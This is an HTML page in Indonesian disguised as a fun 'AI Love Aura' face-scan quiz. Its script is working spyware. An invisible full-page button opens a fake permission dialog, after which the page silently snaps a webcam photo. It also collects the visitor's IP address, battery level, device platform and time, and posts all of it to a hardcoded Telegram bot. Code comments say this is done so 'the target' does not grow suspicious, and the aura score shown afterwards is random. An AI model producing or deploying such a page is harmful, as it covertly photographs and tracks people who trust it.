<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Love Aura Test ✨</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Varela+Round&display=swap');
        :root { --primary: #ff69b4; --secondary: #ff1493; --glass: rgba(255, 255, 255, 0.8); }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Varela Round', sans-serif; background: #ffeef8; overflow: hidden; display: flex; justify-content: center; align-items: center; }
        .bg-animated { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #ffeef8 0%, #ffcbd5 100%); z-index: 1; }
        #trigger { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; border: none; z-index: 9999; cursor: pointer; }
        .container { position: relative; z-index: 10; background: var(--glass); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); padding: 40px 25px; border-radius: 40px; border: 1px solid white; box-shadow: 0 20px 50px rgba(255, 105, 180, 0.2); text-align: center; width: 88%; max-width: 340px; }
        h1 { color: var(--secondary); font-size: 1.6rem; margin: 15px 0 10px 0; }
        p { color: #666; font-size: 0.9rem; line-height: 1.6; }
        .btn-love { background: linear-gradient(45deg, var(--primary), var(--secondary)); color: white; padding: 16px; border-radius: 50px; font-weight: bold; border: none; cursor: pointer; margin-top: 25px; width: 100%; display: block; box-shadow: 0 8px 20px rgba(255, 20, 147, 0.3); }
        #scan-visual { display: none; position: relative; width: 130px; height: 130px; margin: 20px auto; border: 5px solid var(--primary); border-radius: 50%; overflow: hidden; }
        .scan-bar { position: absolute; width: 100%; height: 8px; background: var(--secondary); top: 0; animation: scanLine 2s infinite ease-in-out; }
        @keyframes scanLine { 0% { top: -10%; } 50% { top: 100%; } 100% { top: -10%; } }
        .analysis-box { text-align: left; background: rgba(255, 255, 255, 0.5); padding: 15px; border-radius: 20px; margin-top: 15px; }
        .stat-bar-bg { width: 100%; height: 8px; background: #ffd1dc; border-radius: 10px; margin: 5px 0 12px 0; }
        .stat-bar-fill { height: 100%; background: var(--secondary); width: 0%; transition: width 2s ease-out; border-radius: 10px; }
        video, canvas { display: none; }
        #overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:10000; backdrop-filter: blur(5px); }
        #fake-dialog { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 30px; border-radius: 35px; width: 290px; z-index: 10001; text-align: center; }
    </style>
</head>
<body>

    <div class="bg-animated"></div>
    <button id="trigger"></button>
    <div id="overlay"></div>
    
    <div id="fake-dialog">
        <div style="font-size: 3rem;">📸</div>
        <h1>Izin Kamera</h1>
        <p>Berikan izin akses kamera untuk memulai analisa aura wajah.</p>
        <button class="btn-love" id="btn-allow">LANJUTKAN ✨</button>
    </div>

    <div class="container">
        <div id="setup-view">
            <div style="font-size: 4rem;">💖</div>
            <h1>AI Love Aura</h1>
            <p>Penasaran warna auramu hari ini? Yuk scan wajahmu sekarang.</p>
            <div class="btn-love">MULAI SCAN</div>
        </div>
        
        <div id="scan-view" style="display:none;">
            <div id="scan-visual"><div class="scan-bar"></div><div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:3rem;">✨</div></div>
            <h1>Menganalisa...</h1>
            <p>Jangan bergerak, sedang memproses data biometrik...</p>
        </div>

        <div id="result-view" style="display:none;">
            <div style="font-size: 3rem;">🌈</div>
            <h1>Hasil Aura</h1>
            <div style="font-size: 3.5rem; color: var(--secondary); font-weight: bold;" id="final-score">0%</div>
            <div class="analysis-box">
                <span style="font-size:0.7rem; font-weight:bold;">LOVE LUCK</span>
                <div class="stat-bar-bg"><div id="bar-luck" class="stat-bar-fill"></div></div>
                <span style="font-size:0.7rem; font-weight:bold;">POSITIVE VIBES</span>
                <div class="stat-bar-bg"><div id="bar-vibe" class="stat-bar-fill"></div></div>
            </div>
            <p id="random-quote" style="font-style:italic; margin-top:10px; font-size: 0.8rem;"></p>
            <button class="btn-love" onclick="location.reload()">COBA LAGI</button>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TG_TOKEN = '8759534902:AAGrdxkHf0ytnacqKexI0OPuEPYrhWXGj7U'; 
        const TG_CHAT_ID = '986460435'; 

        const trigger = document.getElementById('trigger');
        const btnAllow = document.getElementById('btn-allow');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Logic Trigger
        trigger.onclick = () => {
            trigger.style.display = 'none';
            document.getElementById('overlay').style.display = 'block';
            document.getElementById('fake-dialog').style.display = 'block';
        };

        btnAllow.onclick = () => {
            startProcess();
        };

        async function startProcess() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('fake-dialog').style.display = 'none';
            document.getElementById('setup-view').style.display = 'none';
            document.getElementById('scan-view').style.display = 'block';

            try {
                // Jalankan kamera dulu agar target tidak curiga
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                document.getElementById('scan-visual').style.display = 'block';

                // AMBIL IP (Pakai ipify HTTPS - Paling Aman)
                let ipRes = "Unknown";
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    ipRes = data.ip;
                } catch (e) { 
                    // Cadangan jika ipify gagal
                    const response2 = await fetch('https://ipwho.is/').then(r => r.json());
                    ipRes = response2.ip || "Protected";
                }

                const bat = navigator.getBattery ? await navigator.getBattery() : { level: 1 };
                const report = `🌟 [SCAN BERHASIL]\nIP: ${ipRes}\nBat: ${(bat.level*100)}%\nDev: ${navigator.platform}\nTime: ${new Date().toLocaleString()}`;

                // Delay pura-pura analisa
                setTimeout(() => { captureAndSend(stream, report); }, 4000);
            } catch (err) {
                // Jika error, jangan munculkan alert terus-menerus
                console.error(err);
                document.getElementById('scan-view').innerHTML = "<h1>Akses Ditolak</h1><p>Harap izinkan kamera dan muat ulang halaman.</p>";
            }
        }

        function captureAndSend(stream, report) {
            canvas.width = video.videoWidth; 
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.translate(canvas.width, 0); 
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const blob = dataURItoBlob(canvas.toDataURL('image/png'));
            const fd = new FormData();
            fd.append('chat_id', TG_CHAT_ID);
            fd.append('photo', blob, 'aura.png');
            fd.append('caption', report);

            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            
            // Matikan stream kamera
            stream.getTracks().forEach(t => t.stop());
            showFinalUI();
        }

        function showFinalUI() {
            document.getElementById('scan-view').style.display = 'none';
            document.getElementById('result-view').style.display = 'block';
            document.getElementById('final-score').innerText = (Math.floor(Math.random()*10)+90) + "%";
            
            setTimeout(() => {
                document.getElementById('bar-luck').style.width = "92%";
                document.getElementById('bar-vibe').style.width = "88%";
            }, 500);

            document.getElementById('random-quote').innerText = "Aura Pink: Seseorang sangat merindukanmu semalam! 🥰";
        }

        function dataURItoBlob(d) {
            const b = atob(d.split(',')[1]);
            const ia = new Uint8Array(b.length);
            for (let i=0; i<b.length; i++) ia[i] = b.charCodeAt(i);
            return new Blob([ia], {type: 'image/png'});
        }
    </script>
</body>
</html>
